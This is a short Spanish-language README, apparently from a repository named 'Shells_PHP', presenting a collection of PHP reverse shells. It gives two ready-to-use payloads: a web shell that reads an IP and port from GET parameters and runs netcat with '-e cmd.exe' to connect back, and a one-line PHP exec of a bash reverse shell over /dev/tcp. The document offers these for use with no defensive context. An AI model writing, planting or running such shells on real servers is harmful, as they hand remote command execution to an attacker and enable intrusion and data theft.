# Shells_PHP
Colección de reverse shells escritas en PHP 


## Para empezar

Colección de shells escritas en PHP para establecer una conexión remota, para distintas situaciones

### PHP + HTTP = GET Shell

Se establece la conexión a través de un simple GET

```
<?php

$ip = $_GET["ip"];
$port = $_GET["port"];
$cmd = "nc -n -v " . $ip . " " . $port . " -e cmd.exe";
# $cmd = "nc " . $ip . " " . $port . " -e cmd.exe";

echo "Executing " . $cmd;
system($cmd);

?>

```

### PHP/bash reverse shell

Sencilla Shell que ejecuta bash en php

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
?>
```


